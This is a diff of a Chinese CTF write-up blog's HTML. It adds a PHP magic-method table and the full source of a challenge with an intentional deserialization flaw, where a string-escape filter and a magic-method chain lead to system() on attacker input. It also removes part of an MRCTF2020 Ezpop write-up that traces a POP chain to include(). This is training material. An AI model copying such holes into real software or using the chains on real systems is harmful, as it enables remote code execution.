+<td>在对象被当做函数处理时自动调用</td>
+</tr>
+<tr>
+<td><code>__call()</code></td>
+<td><code>__call($method, $args)</code> 在调用一个不存在的方法时触发，<code>$args</code> 是数组的形式</td>
+</tr>
+<tr>
+<td><code>__callStatic()</code></td>
+<td>在静态调用或调用成员常量时，使用的方法不存在时触发</td>
+</tr>
+<tr>
+<td><code>__set()</code></td>
+<td>在给不存在的成员属性赋值时触发</td>
+</tr>
+<tr>
+<td><code>__isset()</code></td>
+<td>在对不可访问属性使用 <code>isset()</code> 或 <code>empty()</code> 时会被触发</td>
+</tr>
+<tr>
+<td><code>__unset()</code></td>
+<td>在对不可访问属性使用 <code>unset()</code> 时会被触发</td>
+</tr>
+<tr>
+<td><code>__clone()</code></td>
+<td>当使用 <code>clone</code> 关键字拷贝完成一个对象后就会触发</td>
+</tr>
+<tr>
+<td><code>__get()</code></td>
+<td>当尝试访问不可访问属性时会被自动调用 —— <strong>这才是最关键的知识</strong></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>完整源码</summary>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: text/html; charset=utf-8'</span><span class="p">);</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="k">class</span> <span class="nc">A</span> <span class="p">{</span>
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>    <span class="k">public</span> <span class="nv">$user</span><span class="p">;</span>
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>    <span class="k">public</span> <span class="nv">$sign</span><span class="p">;</span>
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span> <span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user</span> <span class="o">=</span> <span class="nv">$u</span><span class="p">;</span>
+</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sign</span> <span class="o">=</span> <span class="nv">$s</span><span class="p">;</span>
+</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>    <span class="p">}</span>
+</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a>
+</span><span id="__span-21-15"><a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span><span id="__span-21-16"><a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a>        <span class="k">echo</span> <span class="s2">"Welcome to Geek_Challenge2026!&lt;br&gt;"</span><span class="p">;</span>
+</span><span id="__span-21-17"><a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a>        <span class="k">echo</span> <span class="s2">"Profile signature: "</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sign</span> <span class="o">.</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
+</span><span id="__span-21-18"><a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a>    <span class="p">}</span>
+</span><span id="__span-21-19"><a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a><span class="p">}</span>
+</span><span id="__span-21-20"><a id="__codelineno-21-20" name="__codelineno-21-20" href="#__codelineno-21-20"></a>
+</span><span id="__span-21-21"><a id="__codelineno-21-21" name="__codelineno-21-21" href="#__codelineno-21-21"></a><span class="k">class</span> <span class="nc">B</span> <span class="p">{</span>
+</span><span id="__span-21-22"><a id="__codelineno-21-22" name="__codelineno-21-22" href="#__codelineno-21-22"></a>    <span class="k">public</span> <span class="nv">$action</span><span class="p">;</span>
+</span><span id="__span-21-23"><a id="__codelineno-21-23" name="__codelineno-21-23" href="#__codelineno-21-23"></a>
+</span><span id="__span-21-24"><a id="__codelineno-21-24" name="__codelineno-21-24" href="#__codelineno-21-24"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span> <span class="p">{</span>
+</span><span id="__span-21-25"><a id="__codelineno-21-25" name="__codelineno-21-25" href="#__codelineno-21-25"></a>        <span class="k">echo</span> <span class="s2">"唉？你怎么醒了，回去吧你&lt;br&gt;"</span><span class="p">;</span>
+</span><span id="__span-21-26"><a id="__codelineno-21-26" name="__codelineno-21-26" href="#__codelineno-21-26"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">action</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+</span><span id="__span-21-27"><a id="__codelineno-21-27" name="__codelineno-21-27" href="#__codelineno-21-27"></a>    <span class="p">}</span>
+</span><span id="__span-21-28"><a id="__codelineno-21-28" name="__codelineno-21-28" href="#__codelineno-21-28"></a>
+</span><span id="__span-21-29"><a id="__codelineno-21-29" name="__codelineno-21-29" href="#__codelineno-21-29"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span> <span class="p">{</span>
+</span><span id="__span-21-30"><a id="__codelineno-21-30" name="__codelineno-21-30" href="#__codelineno-21-30"></a>        <span class="k">echo</span> <span class="s2">"？！强强？！&lt;br&gt;"</span><span class="p">;</span>
+</span><span id="__span-21-31"><a id="__codelineno-21-31" name="__codelineno-21-31" href="#__codelineno-21-31"></a>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_object</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">action</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">method_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">action</span><span class="p">,</span> <span class="s1">'__invoke'</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-21-32"><a id="__codelineno-21-32" name="__codelineno-21-32" href="#__codelineno-21-32"></a>            <span class="k">return</span> <span class="s1">''</span><span class="p">;</span>
+</span><span id="__span-21-33"><a id="__codelineno-21-33" name="__codelineno-21-33" href="#__codelineno-21-33"></a>        <span class="p">}</span>
+</span><span id="__span-21-34"><a id="__codelineno-21-34" name="__codelineno-21-34" href="#__codelineno-21-34"></a>        <span class="nv">$func</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">action</span><span class="p">;</span>
+</span><span id="__span-21-35"><a id="__codelineno-21-35" name="__codelineno-21-35" href="#__codelineno-21-35"></a>        <span class="k">return</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$func</span><span class="p">();</span>
+</span><span id="__span-21-36"><a id="__codelineno-21-36" name="__codelineno-21-36" href="#__codelineno-21-36"></a>    <span class="p">}</span>
+</span><span id="__span-21-37"><a id="__codelineno-21-37" name="__codelineno-21-37" href="#__codelineno-21-37"></a><span class="p">}</span>
+</span><span id="__span-21-38"><a id="__codelineno-21-38" name="__codelineno-21-38" href="#__codelineno-21-38"></a>
+</span><span id="__span-21-39"><a id="__codelineno-21-39" name="__codelineno-21-39" href="#__codelineno-21-39"></a><span class="k">class</span> <span class="nc">C</span> <span class="p">{</span>
+</span><span id="__span-21-40"><a id="__codelineno-21-40" name="__codelineno-21-40" href="#__codelineno-21-40"></a>    <span class="k">public</span> <span class="nv">$target</span><span class="p">;</span>
+</span><span id="__span-21-41"><a id="__codelineno-21-41" name="__codelineno-21-41" href="#__codelineno-21-41"></a>    <span class="k">public</span> <span class="nv">$method</span><span class="p">;</span>
+</span><span id="__span-21-42"><a id="__codelineno-21-42" name="__codelineno-21-42" href="#__codelineno-21-42"></a>
+</span><span id="__span-21-43"><a id="__codelineno-21-43" name="__codelineno-21-43" href="#__codelineno-21-43"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span> <span class="p">{</span>
+</span><span id="__span-21-44"><a id="__codelineno-21-44" name="__codelineno-21-44" href="#__codelineno-21-44"></a>        <span class="k">echo</span> <span class="s2">"666，还有第二关&lt;br&gt;"</span><span class="p">;</span>
+</span><span id="__span-21-45"><a id="__codelineno-21-45" name="__codelineno-21-45" href="#__codelineno-21-45"></a>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_object</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">target</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">method</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-21-46"><a id="__codelineno-21-46" name="__codelineno-21-46" href="#__codelineno-21-46"></a>            <span class="k">return</span> <span class="s1">''</span><span class="p">;</span>
+</span><span id="__span-21-47"><a id="__codelineno-21-47" name="__codelineno-21-47" href="#__codelineno-21-47"></a>        <span class="p">}</span>
+</span><span id="__span-21-48"><a id="__codelineno-21-48" name="__codelineno-21-48" href="#__codelineno-21-48"></a>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">method_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">target</span><span class="p">,</span> <span class="s1">'__call'</span><span class="p">)</span> <span class="o">||</span> <span class="nb">method_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">target</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">method</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-21-49"><a id="__codelineno-21-49" name="__codelineno-21-49" href="#__codelineno-21-49"></a>            <span class="k">return</span> <span class="s1">''</span><span class="p">;</span>
+</span><span id="__span-21-50"><a id="__codelineno-21-50" name="__codelineno-21-50" href="#__codelineno-21-50"></a>        <span class="p">}</span>
+</span><span id="__span-21-51"><a id="__codelineno-21-51" name="__codelineno-21-51" href="#__codelineno-21-51"></a>        <span class="nv">$m</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">method</span><span class="p">;</span>
+</span><span id="__span-21-52"><a id="__codelineno-21-52" name="__codelineno-21-52" href="#__codelineno-21-52"></a>        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">target</span><span class="o">-&gt;</span><span class="nv">$m</span><span class="p">();</span>
+</span><span id="__span-21-53"><a id="__codelineno-21-53" name="__codelineno-21-53" href="#__codelineno-21-53"></a>    <span class="p">}</span>
+</span><span id="__span-21-54"><a id="__codelineno-21-54" name="__codelineno-21-54" href="#__codelineno-21-54"></a><span class="p">}</span>
+</span><span id="__span-21-55"><a id="__codelineno-21-55" name="__codelineno-21-55" href="#__codelineno-21-55"></a>
+</span><span id="__span-21-56"><a id="__codelineno-21-56" name="__codelineno-21-56" href="#__codelineno-21-56"></a><span class="k">class</span> <span class="nc">D</span> <span class="p">{</span>
+</span><span id="__span-21-57"><a id="__codelineno-21-57" name="__codelineno-21-57" href="#__codelineno-21-57"></a>    <span class="k">public</span> <span class="nv">$next</span><span class="p">;</span>
+</span><span id="__span-21-58"><a id="__codelineno-21-58" name="__codelineno-21-58" href="#__codelineno-21-58"></a>    <span class="k">public</span> <span class="nv">$property</span><span class="p">;</span>
+</span><span id="__span-21-59"><a id="__codelineno-21-59" name="__codelineno-21-59" href="#__codelineno-21-59"></a>
+</span><span id="__span-21-60"><a id="__codelineno-21-60" name="__codelineno-21-60" href="#__codelineno-21-60"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$arguments</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-21-61"><a id="__codelineno-21-61" name="__codelineno-21-61" href="#__codelineno-21-61"></a>        <span class="k">echo</span> <span class="s2">"马上就到了&lt;br&gt;"</span><span class="p">;</span>
+</span><span id="__span-21-62"><a id="__codelineno-21-62" name="__codelineno-21-62" href="#__codelineno-21-62"></a>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_object</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">next</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">property</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-21-63"><a id="__codelineno-21-63" name="__codelineno-21-63" href="#__codelineno-21-63"></a>            <span class="k">return</span> <span class="s1">''</span><span class="p">;</span>
+</span><span id="__span-21-64"><a id="__codelineno-21-64" name="__codelineno-21-64" href="#__codelineno-21-64"></a>        <span class="p">}</span>
+</span><span id="__span-21-65"><a id="__codelineno-21-65" name="__codelineno-21-65" href="#__codelineno-21-65"></a>        <span class="nv">$p</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">property</span><span class="p">;</span>
+</span><span id="__span-21-66"><a id="__codelineno-21-66" name="__codelineno-21-66" href="#__codelineno-21-66"></a>        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">next</span><span class="o">-&gt;</span><span class="nv">$p</span><span class="p">;</span>
+</span><span id="__span-21-67"><a id="__codelineno-21-67" name="__codelineno-21-67" href="#__codelineno-21-67"></a>    <span class="p">}</span>
+</span><span id="__span-21-68"><a id="__codelineno-21-68" name="__codelineno-21-68" href="#__codelineno-21-68"></a><span class="p">}</span>
+</span><span id="__span-21-69"><a id="__codelineno-21-69" name="__codelineno-21-69" href="#__codelineno-21-69"></a>
+</span><span id="__span-21-70"><a id="__codelineno-21-70" name="__codelineno-21-70" href="#__codelineno-21-70"></a><span class="k">class</span> <span class="nc">E</span> <span class="p">{</span>
+</span><span id="__span-21-71"><a id="__codelineno-21-71" name="__codelineno-21-71" href="#__codelineno-21-71"></a>    <span class="k">public</span> <span class="nv">$sink</span><span class="p">;</span>
+</span><span id="__span-21-72"><a id="__codelineno-21-72" name="__codelineno-21-72" href="#__codelineno-21-72"></a>    <span class="k">public</span> <span class="nv">$cmd</span><span class="p">;</span>
+</span><span id="__span-21-73"><a id="__codelineno-21-73" name="__codelineno-21-73" href="#__codelineno-21-73"></a>
+</span><span id="__span-21-74"><a id="__codelineno-21-74" name="__codelineno-21-74" href="#__codelineno-21-74"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-21-75"><a id="__codelineno-21-75" name="__codelineno-21-75" href="#__codelineno-21-75"></a>        <span class="k">echo</span> <span class="s2">"还有一步&lt;br&gt;"</span><span class="p">;</span>
+</span><span id="__span-21-76"><a id="__codelineno-21-76" name="__codelineno-21-76" href="#__codelineno-21-76"></a>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sink</span> <span class="nx">instanceof</span> <span class="nx">F</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-21-77"><a id="__codelineno-21-77" name="__codelineno-21-77" href="#__codelineno-21-77"></a>            <span class="k">return</span><span class="p">;</span>
+</span><span id="__span-21-78"><a id="__codelineno-21-78" name="__codelineno-21-78" href="#__codelineno-21-78"></a>        <span class="p">}</span>
+</span><span id="__span-21-79"><a id="__codelineno-21-79" name="__codelineno-21-79" href="#__codelineno-21-79"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sink</span><span class="o">-&gt;</span><span class="na">flag_trigger</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span><span class="p">;</span>
+</span><span id="__span-21-80"><a id="__codelineno-21-80" name="__codelineno-21-80" href="#__codelineno-21-80"></a>    <span class="p">}</span>
+</span><span id="__span-21-81"><a id="__codelineno-21-81" name="__codelineno-21-81" href="#__codelineno-21-81"></a><span class="p">}</span>
+</span><span id="__span-21-82"><a id="__codelineno-21-82" name="__codelineno-21-82" href="#__codelineno-21-82"></a>
+</span><span id="__span-21-83"><a id="__codelineno-21-83" name="__codelineno-21-83" href="#__codelineno-21-83"></a><span class="k">class</span> <span class="nc">F</span> <span class="p">{</span>
+</span><span id="__span-21-84"><a id="__codelineno-21-84" name="__codelineno-21-84" href="#__codelineno-21-84"></a>    <span class="k">private</span> <span class="nv">$flag_trigger</span><span class="p">;</span>
+</span><span id="__span-21-85"><a id="__codelineno-21-85" name="__codelineno-21-85" href="#__codelineno-21-85"></a>
+</span><span id="__span-21-86"><a id="__codelineno-21-86" name="__codelineno-21-86" href="#__codelineno-21-86"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-21-87"><a id="__codelineno-21-87" name="__codelineno-21-87" href="#__codelineno-21-87"></a>        <span class="k">if</span> <span class="p">(</span><span class="nv">$name</span> <span class="o">!==</span> <span class="s1">'flag_trigger'</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-21-88"><a id="__codelineno-21-88" name="__codelineno-21-88" href="#__codelineno-21-88"></a>            <span class="k">return</span><span class="p">;</span>
+</span><span id="__span-21-89"><a id="__codelineno-21-89" name="__codelineno-21-89" href="#__codelineno-21-89"></a>        <span class="p">}</span>
+</span><span id="__span-21-90"><a id="__codelineno-21-90" name="__codelineno-21-90" href="#__codelineno-21-90"></a>        <span class="k">echo</span> <span class="s2">"RCE:&lt;br&gt;"</span><span class="p">;</span>
+</span><span id="__span-21-91"><a id="__codelineno-21-91" name="__codelineno-21-91" href="#__codelineno-21-91"></a>        <span class="nb">system</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+</span><span id="__span-21-92"><a id="__codelineno-21-92" name="__codelineno-21-92" href="#__codelineno-21-92"></a>    <span class="p">}</span>
+</span><span id="__span-21-93"><a id="__codelineno-21-93" name="__codelineno-21-93" href="#__codelineno-21-93"></a><span class="p">}</span>
+</span><span id="__span-21-94"><a id="__codelineno-21-94" name="__codelineno-21-94" href="#__codelineno-21-94"></a>
+</span><span id="__span-21-95"><a id="__codelineno-21-95" name="__codelineno-21-95" href="#__codelineno-21-95"></a><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-21-96"><a id="__codelineno-21-96" name="__codelineno-21-96" href="#__codelineno-21-96"></a>    <span class="k">return</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"admin"</span><span class="p">,</span> <span class="s2">"hacker"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+</span><span id="__span-21-97"><a id="__codelineno-21-97" name="__codelineno-21-97" href="#__codelineno-21-97"></a><span class="p">}</span>
+</span><span id="__span-21-98"><a id="__codelineno-21-98" name="__codelineno-21-98" href="#__codelineno-21-98"></a>
+</span><span id="__span-21-99"><a id="__codelineno-21-99" name="__codelineno-21-99" href="#__codelineno-21-99"></a><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'user'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'sign'</span><span class="p">]))</span> <span class="p">{</span>
+</span><span id="__span-21-100"><a id="__codelineno-21-100" name="__codelineno-21-100" href="#__codelineno-21-100"></a>    <span class="nv">$u</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'user'</span><span class="p">];</span>
+</span><span id="__span-21-101"><a id="__codelineno-21-101" name="__codelineno-21-101" href="#__codelineno-21-101"></a>    <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'sign'</span><span class="p">];</span>
+</span><span id="__span-21-102"><a id="__codelineno-21-102" name="__codelineno-21-102" href="#__codelineno-21-102"></a>
+</span><span id="__span-21-103"><a id="__codelineno-21-103" name="__codelineno-21-103" href="#__codelineno-21-103"></a>    <span class="nv">$entry</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">A</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span> <span class="nv">$s</span><span class="p">);</span>
+</span><span id="__span-21-104"><a id="__codelineno-21-104" name="__codelineno-21-104" href="#__codelineno-21-104"></a>    <span class="nv">$ser</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$entry</span><span class="p">);</span>
+</span><span id="__span-21-105"><a id="__codelineno-21-105" name="__codelineno-21-105" href="#__codelineno-21-105"></a>
+</span><span id="__span-21-106"><a id="__codelineno-21-106" name="__codelineno-21-106" href="#__codelineno-21-106"></a>    <span class="nv">$escaped</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nv">$ser</span><span class="p">);</span>
+</span><span id="__span-21-107"><a id="__codelineno-21-107" name="__codelineno-21-107" href="#__codelineno-21-107"></a>
+</span><span id="__span-21-108"><a id="__codelineno-21-108" name="__codelineno-21-108" href="#__codelineno-21-108"></a>    <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$escaped</span><span class="p">);</span>
+</span><span id="__span-21-109"><a id="__codelineno-21-109" name="__codelineno-21-109" href="#__codelineno-21-109"></a><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span id="__span-21-110"><a id="__codelineno-21-110" name="__codelineno-21-110" href="#__codelineno-21-110"></a>    <span class="k">echo</span> <span class="s2">"w(ﾟДﾟ)w"</span><span class="p">;</span>
+</span><span id="__span-21-111"><a id="__codelineno-21-111" name="__codelineno-21-111" href="#__codelineno-21-111"></a><span class="p">}</span>
+</span><span id="__span-21-112"><a id="__codelineno-21-112" name="__codelineno-21-112" href="#__codelineno-21-112"></a><span class="cp">?&gt;</span>
+</span></code></pre></div>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-10-29 00:00:00+00:00">2026-10-29</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
               <a href="category/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/" class="md-meta__link">路径遍历</a></li>
         
         
@@ -2826,7 +3313,7 @@
 <hr />
 <h3 id="_1"><a class="toclink" href="zerog2026-stage2-ssrf/#_1">题目概述</a></h3>
 <blockquote>
-<p><strong>和 <a href="zerog2026-stage2.md">ZeroG_2026（Stage 2）</a> 不是同一题</strong> —— 那篇是 PHP 弱类型与参数名变形，这篇是 SSRF。</p>
+<p><strong>和 <a href="../zerog2026-stage2/">ZeroG_2026（Stage 2）</a> 不是同一题</strong> —— 那篇是 PHP 弱类型与参数名变形，这篇是 SSRF。</p>
 </blockquote>
 <p>站点叫 Internal Shop，是一个"多平台价格比价系统"。输入商品页 URL，服务端去抓取并比价。</p>
 <p><img alt="题目首页" src="../assets/images/zerog2026-stage2-ssrf/01-home.png" /></p>
@@ -3701,147 +4188,6 @@
 <p><strong>这里有个地方值得停一下</strong>：<code>rename</code> 之后新的 <code>words</code> 表只剩 <code>id</code> 一列，而原始语句是 <code>select *</code>，页面是按两列渲染的 —— 少一列为什么还能出？</p>
 <p>我这边是<strong>直接出的 flag，没有报错</strong>。所以 PHP 那边应该只是把第一列取出来显示，缺第二列不影响，顶多是个 Notice 被吞掉了。</p>
 <hr />
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-10-26 00:00:00+00:00">2026-10-26</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="category/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-meta__link">反序列化</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 3 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="mrctf2020-ezpop"><a class="toclink" href="mrctf2020-ezpop/">[MRCTF2020] Ezpop</a></h2>
-<p><img alt="源码 1/2" src="../assets/images/mrctf2020-ezpop/01-source-a.png" /></p>
-<p><img alt="源码 2/2" src="../assets/images/mrctf2020-ezpop/02-source-b.png" /></p>
-<h3 id="_1"><a class="toclink" href="mrctf2020-ezpop/#_1">先审计代码</a></h3>
-<p>发现是 PHP 序列化串（先附上相关知识点）：</p>
-<p><img alt="魔术方法表" src="../assets/images/mrctf2020-ezpop/03-magic.png" /></p>
-<h3 id="_2"><a class="toclink" href="mrctf2020-ezpop/#_2">从终点往回找</a></h3>
-<p>先找可以执行的地方。</p>
-<p>在 <code>Modifier</code> 类的 <code>append</code> 下有 <code>include</code> 可以利用，而调用 <code>include</code> 需要先有 <code>__invoke</code> 的调用。</p>
-<p>触发 <code>__invoke</code> 的方式是<strong>有对象被当成函数来调用</strong>，所以去找哪里是可以把对象当成函数来调用的 —— 观察到在 <code>Test</code> 类的 <code>__get()</code> 里会调用 <code>$function()</code>，也就达成了 <code>__invoke</code> 的触发要求。</p>
-<p>再看 <code>__get</code> 的触发条件：<strong>当访问不存在的属性时会被调用</strong>。也就是说，访问 <code>Test</code> 类中不存在的属性时会被调用。</p>
-<p>所以这里再去看最后一个类，发现 <code>__toString</code> 中会去访问 <code>$this-&gt;str-&gt;source</code> —— 这里我们只要让 <code>str</code> 为 <code>Test</code> 类，那它去访问 <code>str-&gt;source</code> 时就会触发 <code>__get</code>。</p>
-<p>接着要考虑 <code>__toString</code> 的触发条件：<strong>当把一个对象当成字符串来执行时会触发</strong>。</p>
-<p>那很明显就是 <code>preg_match</code>：</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="x">preg_match('/正则表达式/', $字符串, $匹配结果数组);</span>
-</span></code></pre></div>
-<p>这里他把 <code>$this-&gt;source</code> 放进了 <code>preg_match</code> 的第二个参数，所以我们只要让他作为一个类 —— 又因为要同时包含 <code>str</code>，所以只能是 <code>Show</code> 类。</p>
-<p>最后是如何触发 <code>__wakeup</code>：它的触发条件是<strong>当使用 <code>unserialize</code> 时触发</strong>，那么就完成了闭环。</p>
-<h4 id="_3"><a class="toclink" href="mrctf2020-ezpop/#_3">逆推方向（找链的顺序）</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>include ← __invoke ← __get ← __toString ← __wakeup ← unserialize($_GET['pop'])
-</span></code></pre></div>
-<p><strong>这是从终点往入口找的顺序。</strong></p>
-<h4 id="_4"><a class="toclink" href="mrctf2020-ezpop/#_4">正向执行顺序（实际跑起来的样子）</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>unserialize($_GET['pop'])
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>    → Show::__wakeup()          preg_match(..., $this-&gt;source) 把对象当字符串
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>    → Show::__toString()        $this-&gt;str-&gt;source 读不存在的属性
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>    → Test::__get('source')     $function = $this-&gt;p; $function()
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>    → Modifier::__invoke()      $this-&gt;append($this-&gt;var)
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>    → Modifier::append()        include($value)
-</span></code></pre></div>
-<p><strong>这条 POP 链就走完了。</strong></p>
-<h3 id="_5"><a class="toclink" href="mrctf2020-ezpop/#_5">构造序列化</a></h3>
-<p><img alt="生成 payload" src="../assets/images/mrctf2020-ezpop/04-payload.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="x">class Modifier {</span>
